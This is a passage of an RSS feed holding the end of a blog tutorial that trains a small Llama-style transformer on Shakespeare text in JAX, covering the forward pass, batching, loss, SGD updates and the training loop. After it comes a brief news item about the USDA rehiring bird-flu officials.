        rms_norm(<span>x</span>, <span>params</span>[<span>'attention_norm'</span>]),
        <span>mask</span>,
        <span>freqs_cis</span>,
        <span>n_heads</span>,
        <span>n_kv_heads</span>,
        <span>cache</span>,
        <span>position</span>
    )
    
    <span># First residual connection</span>
    <span>h</span> = <span>x</span> + <span>attn_output</span>
    
    <span># Apply feed-forward network with normalization and residual</span>
    <span>ffn_output</span> = feed_forward(<span>params</span>[<span>'ffn'</span>], rms_norm(<span>h</span>, <span>params</span>[<span>'ffn_norm'</span>]))
    
    <span># Second residual connection</span>
    <span>out</span> = <span>h</span> + <span>ffn_output</span>
    
    <span>return</span> <span>out</span>, <span>new_cache</span></code></pre>
</div>

<div>
    <h2 id="section-10">Forward-Pass</h2>

    <p> The forward pass takes your data through the entire model from converting input tokens into embeddings, through a series of transformer blocks, and finally to the output layer. In other words, it connects all the layers (embedding, transformers, and output) to produce the final predictions.</p></div>




<div>
    <pre><code><span># Forward pass through the entire model</span>
<span>def</span> <span>model_forward</span>(<span>params</span>, <span>inputs</span>, <span>config</span>, <span>cache</span>=<span>None</span>, <span>position</span>=<span>0</span>):
    <span># Get batch dimensions</span>
    <span>B</span>, <span>T</span> = <span>inputs</span>.shape
    
    <span># Convert input tokens to embeddings</span>
    <span>h</span> = <span>params</span>[<span>'token_embedding'</span>][<span>inputs</span>]
    
    <span># Compute freqs_cis for this forward pass</span>
    <span>freqs_cis</span> = <span>precompute_freqs_cis</span>(<span>config</span>.<span>dim</span> // <span>config</span>.<span>n_heads</span>, <span>config</span>.<span>max_seq_len</span>)
    
    <span># Create causal mask</span>
    <span>mask</span> = <span>jnp</span>.<span>tril</span>(<span>jnp</span>.<span>ones</span>((<span>config</span>.<span>max_seq_len</span>, <span>config</span>.<span>max_seq_len</span>)))
    <span>mask</span> = <span>jnp</span>.<span>where</span>(<span>mask</span> == <span>0</span>, -<span>1e9</span>, <span>0.0</span>)
    <span>mask</span> = <span>mask</span>.<span>astype</span>(<span>h</span>.<span>dtype</span>)
    <span>mask</span> = <span>mask</span>[<span>None</span>, <span>None</span>, :, :]

    <span># Process through transformer blocks</span>
    <span>new_caches</span> = []
    <span>for</span> <span>i</span>, <span>block</span> <span>in</span> <span>enumerate</span>(<span>params</span>[<span>'blocks'</span>]):
        <span>layer_cache</span> = <span>cache</span>[<span>i</span>] <span>if</span> <span>cache</span> <span>is not</span> <span>None</span> <span>else</span> <span>None</span>
        <span>h</span>, <span>layer_cache</span> = <span>transformer_block</span>(
            <span>block</span>, <span>h</span>, <span>mask</span>, <span>freqs_cis</span>,
            <span>config</span>.<span>n_heads</span>, <span>config</span>.<span>n_kv_heads</span>,
            <span>layer_cache</span>, <span>position</span>, training=<span>False</span>)
        <span>new_caches</span>.<span>append</span>(<span>layer_cache</span>)

    <span># Final normalization and output projection</span>
    <span>h</span> = <span>rms_norm</span>(<span>h</span>, <span>params</span>[<span>'norm_f'</span>])
    <span>logits</span> = <span>jnp</span>.<span>dot</span>(<span>h</span>, <span>params</span>[<span>'output'</span>])
    
    <span>return</span> <span>logits</span>, <span>new_caches</span></code></pre>
</div>





          <div>
              <h2 id="section-11">Dataset</h2>
          
              <p>Now the model part is complete so its time to train our model on shakespeare dataset. First we will read our data from <strong>.txt</strong> file then we will encode our data with bpe and then convert it into jax array.</p>
          </div>

<div>
<pre><code><span># Initialize tokenizer and load data</span>
<span>enc</span> = <span>tiktoken.get_encoding</span>(<span>"gpt2"</span>)

<span># Read text file</span>
<span>with</span> <span>open</span>(<span>'shakespeare.txt'</span>, <span>'r'</span>) <span>as</span> <span>f</span>:
    <span>text</span> = <span>f.read</span>()

<span># Convert text to token IDs</span>
<span>tokens</span> = <span>enc.encode</span>(<span>text</span>)
<span># Convert to JAX array</span>
<span>data</span> = <span>jnp.array</span>(<span>tokens</span>)
</code></pre> 
</div>

<div>
    <h3 id="section-1">Get Batches</h3>
    <p>The get_batch function creates training batches from our Shakespeare dataset. We need to feed our model with chunks of data. For each batch, we randomly select starting positions in the text, this way the model sees a variety of contexts. </p>
    <p>Now, here's where JAX's cool vmap feature comes into play. Instead of writing a loop to extract each chunk, we use vmap to automate.</p>
    <p><strong>How does it work ?</strong></p>
    <p> vmap is like a vectorized loop; it takes a function that processes a single index (using <strong>lax.dynamic_slice </strong> to get a sequence of tokens) and applies it to every element in our array of indices. This means our input sequences (x) and corresponding target sequences (y, which are shifted by one token for next-word prediction) are created in one go.</p>

<div>
    <pre><code><span>def</span> <span>get_batch</span>(<span>key</span>, <span>data</span>, <span>batch_size</span>, <span>seq_len</span>):
    <span># Generate random starting indices</span>
    <span>ix</span> = <span>random</span>.<span>randint</span>(<span>key</span>, (<span>batch_size</span>,), <span>0</span>, <span>len</span>(<span>data</span>) - <span>seq_len</span>)
    
    <span># Vectorized operation to get input and target sequences</span>
    <span>x</span> = <span>vmap</span>(<span>lambda</span> <span>i</span>: <span>lax</span>.<span>dynamic_slice</span>(<span>data</span>, (<span>i</span>,), (<span>seq_len</span>,)))(<span>ix</span>)
    <span>y</span> = <span>vmap</span>(<span>lambda</span> <span>i</span>: <span>lax</span>.<span>dynamic_slice</span>(<span>data</span>, (<span>i</span> + <span>1</span>,), (<span>seq_len</span>,)))(<span>ix</span>)
    
    <span>return</span> <span>x</span>, <span>y</span>
</code></pre>
</div>
    

   



</div>



            <div>
                                    <h2 id="section-13">Loss Function</h2>
                                    <p>This function computes the cross-entropy loss for a batch during training. It first performs a forward pass using the model to generate logits for the input data. Then, it reshapes both the logits and targets to merge the batch and sequence dimensions. After applying the log softmax to the logits, it extracts the log probabilities corresponding to the correct target tokens and computes their negative mean as the final loss value.</p>
            
                                    
            
            <p>The cross-entropy loss is defined as:</p>
            <p>
             \[
            \mathcal{L} = -\frac{1}{N} \sum_{i=1}^{N} \log P(y_i)
            \]
            </p>
            
            <p>Where:</p>
            <div>
               
            <ul>
              <li>\( P(y_i) \) is the probability of the correct class, calculated using the softmax function:</li>
            </ul>
            </div>
            
            <p>
                \[
            P(y_i) = \frac{e^{z_i}}{\sum_{j} e^{z_j}}
            \]
            </p>


<div>
    <pre><code><span># Compute cross-entropy loss</span>
<span>def</span> <span>compute_loss</span>(<span>params</span>, <span>batch</span>):
    <span># Split batch into inputs and targets</span>
    <span>inputs</span>, <span>targets</span> = <span>batch</span>
    <span># Forward pass to get logits</span>
    <span>logits</span>, = model_forward(<span>params</span>, <span>inputs</span>, <span>config</span>)
    <span># Reshape for loss computation</span>
    <span>logits</span> = <span>logits</span>.reshape(-<span>1</span>, <span>config</span>.vocab_size)
    <span>targets</span> = <span>targets</span>.reshape(-<span>1</span>)
    <span># Calculate negative log likelihood</span>
    <span>loss</span> = -jnp.mean(jnp.take_along_axis(jax.nn.log_softmax(<span>logits</span>),
    <span>targets</span>[:, <span>None</span>], axis=<span>1</span>))
    <span>return</span> <span>loss</span></code></pre>
    </div>

       
       <div>
       <h2 id="section-14">Update function</h2>
       
       <p>Now we need to write a function to update our weights. For simplicity, we're using Stochastic Gradient Descent (SGD) here, though you can also use Adam or AdamW for faster convergence.
       </p>
       
       <p>In the code, you'll notice the <strong>@jax.jit</strong> decorator. This is one of the features that sets <strong>jax</strong> apart. JIT (Just-In-Time) compilation speeds up execution by converting your Python code into optimized machine code.</p>
        
       <p><strong>How does it work ?</strong></p>

       <p>When you decorate a function with JAX’s jit, it changes how the function executes. Normally, when you call a function, Python runs it line by line. For example, if you have:
       </p>
<div> <pre><code><span>def</span> <span>sqr</span>(<span>x</span>): 
    <span>print</span>(<span>"HI jiited"</span>)<span> # side effect</span> 
    <span>return</span> <span>x</span> * <span>x</span>

<span>print</span>(<span>sqr</span>(<span>2</span>)) 
<span>print</span>(<span>sqr</span>(<span>3</span>)) 
<span>print</span>(<span>sqr</span>(<span>4</span>))</code></pre>
</div>


    <p>Every time you call sqr, it prints "HI jiited" and then returns the square of the number. However, when you add the @jax.jit decorator:</p>


<div> <pre><code><span>@</span><span>jax</span>.<span>jit</span>
<span>def</span> <span>sqr</span>(<span>x</span>): 
    <span>print</span>(<span>"HI jiited"</span>)<span> # side effect</span>  
    <span>return</span> <span>x</span> * <span>x</span>

<span>print</span>(<span>sqr</span>(<span>2</span>)) 
<span>print</span>(<span>sqr</span>(<span>3</span>)) 
<span>print</span>(<span>sqr</span>(<span>4</span>))</code></pre>
</div>

<p><strong>Jax </strong>first traces your function to build an optimized computation graph. This tracing happens the first time the function is called and converts the Python code into machine code.</p>

<p>Because of this tracing, any side effects like the print statement; are only executed during the initial tracing. Once the function is compiled, other remaining    calls use the compiled version, and you might not see the print output every time.</p>








<div>
<pre><code><span>@</span><span>jax</span>.<span>jit</span>
<span>def</span> <span>update_step</span>(<span>params</span>, <span>batch</span>):
    <span># Compute both loss and gradients in a single pass using value_and_grad</span>
    <span># This is more efficient than computing them separately</span>
    <span>loss</span>, <span>grads</span> = <span>jax.value_and_grad</span>(<span>compute_loss</span>)(<span>params</span>, <span>batch</span>)

    <span># Update parameters using gradient descent</span>
    <span># jax.tree.map applies the update rule to each parameter in the model</span>
    <span># The lambda function implements: p_new = p_old - learning_rate * gradient</span>
    <span>params</span> = <span>jax.tree.map</span>(
        <span>lambda</span> <span>p</span>, <span>g</span>: <span>p</span> - <span>config.learning_rate</span> * <span>g</span>,
        <span>params</span>,
        <span>grads</span>
    )

    <span># Return updated parameters and the loss value for monitoring training</span>
    <span>return</span> <span>params</span>, <span>loss</span></code></pre>
</div>
<p>In our <strong>update_step</strong> function, <strong>@jax.jit</strong> compiles the code. The function computes loss and gradients simultaneously with <strong>jax.value_and_grad</strong>, updates the parameters using gradient descent with help of <strong>jax.tree.map</strong>, and returns the updated parameters and loss.</p>

</div>


             
              


              <div>
                 <h2 id="section-15">Trainig-Loop</h2>
                 <p>Finally, its time to train our 2 million parameter model on shakespeare dataset. 
                    We first prepare batches using the <strong>get_batch</strong> which splits our data into batches so we can train faster with 
                     our limited compute.
                 </p>
             </div>

<div>
 <pre><code><span>for</span> <span>epoch</span> <span>in</span> <span>range</span>(<span>num_epochs</span>):
 
   
   <span>epoch_loss</span> = <span>0.0</span>

   <span>for</span> <span>step</span> <span>in</span> <span>range</span>(<span>steps_per_epoch</span>):
   
      <span># Generate new random keys for reproducibility</span>
      <span>key</span>, <span>batch_key</span> = <span>random.split</span>(<span>key</span>)
      
      <span># Sample random batch of sequences</span>
      <span>batch</span> = <span>get_batch</span>(<span>batch_key</span>, <span>data</span>, <span>config.batch_size</span>, <span>config.max_seq_len</span>)
      
      <span># Forward pass, compute loss and update parameters</span>
      <span>params_state</span>, <span>loss</span> = <span>update_step</span>(<span>params_state</span>, <span>batch</span>)
     
      <span># loss for epoch average</span>
      <span>epoch_loss</span> += <span>loss</span>
      
   
      <span>if</span> <span>step</span> % <span>100</span> == <span>0</span>:
            <span>print</span>(<span>f"epoch {epoch + 1}, step {step}/{steps_per_epoch}: loss = {loss:.4f}"</span>)
      

  <span>avg_epoch_loss</span> = <span>epoch_loss</span> / <span>steps_per_epoch</span>
     
 
  <span>epoch_losses</span>.<span>append</span>(<span>avg_epoch_loss</span>)
      
  
  <span>print</span>(<span>f"\nepoch {epoch + 1} | average loss: {avg_epoch_loss:.4f}"</span>)</code></pre>


</div>


<p><img src="https://saurabhalone.com/blogs/llama3/images/train.png" alt="Llama architecture">
    <img src="https://saurabhalone.com/blogs/llama3/images/train.png" alt="Llama architecture">
</p>
  




               




<hr>
<div>
    <h3>Thank you for reading this far !! </h3>
    <h3>You can support me :</h3>
    <div>
        <ul>
            <li><a href="https://x.com/saurabhalonee">Twitter</a></li>
            <li><a href="https://buymeacoffee.com/saurabhaloq">Buy-me-Coffe</a></li>
            <li><a href="https://github.com/saurabhaloneai">Github</a></li>
        </ul>
    </div>
</div>












    



</div></article>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[USDA fired officials working on bird flu, now trying to rehire them (180 pts)]]></title>
            <link>https://www.nbcnews.com/politics/doge/usda-accidentally-fired-officials-bird-flu-rehire-rcna192716</link>
            <guid>43097709</guid>
            <pubDate>Wed, 19 Feb 2025 02:04:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nbcnews.com/politics/doge/usda-accidentally-fired-officials-bird-flu-rehire-rcna192716">https://www.nbcnews.com/politics/doge/usda-accidentally-fired-officials-bird-flu-rehire-rcna192716</a>, See on <a href="https://news.ycombinator.com/item?id=43097709">Hacker News</a></p>
Couldn't get https://www.nbcnews.com/politics/doge/usda-accidentally-fired-officials-bird-flu-rehire-rcna192716: Error: timeout of 10000ms exceeded]]></description>
        </item>
    </channel>
</rss>